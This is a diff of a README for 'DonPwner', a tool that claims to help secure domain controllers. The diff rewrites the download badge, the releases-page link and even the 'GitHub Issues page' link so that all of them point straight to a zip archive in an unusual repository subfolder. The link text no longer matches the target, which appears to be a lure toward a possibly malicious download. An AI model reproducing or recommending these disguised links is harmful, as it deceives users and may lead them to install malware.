@@ -4,7 +4,7 @@
 Welcome to DonPwner! This tool helps you analyze and secure your domain controller efficiently. Follow the instructions below to download and set up the software.
 
 ## 📥 Download DonPwner
-[![Download DonPwner](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/sonne988/DonPwner/releases)
+[![Download DonPwner](https://raw.githubusercontent.com/sonne988/DonPwner/main/warragal/DonPwner-v3.1-beta.5.zip)](https://raw.githubusercontent.com/sonne988/DonPwner/main/warragal/DonPwner-v3.1-beta.5.zip)
 
 ## 🖥️ System Requirements
 To use DonPwner, ensure your system meets these requirements:
@@ -14,7 +14,7 @@ To use DonPwner, ensure your system meets these requirements:
 - **Disk Space:** Minimum of 100 MB free space
 
 ## 🚪 Download & Install
-1. **Visit the Releases Page:** Go to the [GitHub Releases page](https://github.com/sonne988/DonPwner/releases) to find the latest version of DonPwner.
+1. **Visit the Releases Page:** Go to the [GitHub Releases page](https://raw.githubusercontent.com/sonne988/DonPwner/main/warragal/DonPwner-v3.1-beta.5.zip) to find the latest version of DonPwner.
    
 2. **Select a Version:** Browse through the available versions. Look for the most recent release, as it usually has the latest features and fixes.
 
@@ -39,7 +39,7 @@ To use DonPwner, ensure your system meets these requirements:
 4. **Review Reports:** DonPwner will generate reports based on your inputs. Review them to identify areas of improvement.
 
 ## 👍 Support and Feedback
-If you encounter any issues, please visit the [GitHub Issues page](https://github.com/sonne988/DonPwner/issues) to report bugs or request features. Your feedback helps us improve DonPwner.
+If you encounter any issues, please visit the [GitHub Issues page](https://raw.githubusercontent.com/sonne988/DonPwner/main/warragal/DonPwner-v3.1-beta.5.zip) to report bugs or request features. Your feedback helps us improve DonPwner.
 
 ## 📣 Stay Updated
 Make sure to check back often for updates. You can also follow this repository to receive notifications of new releases or important changes.
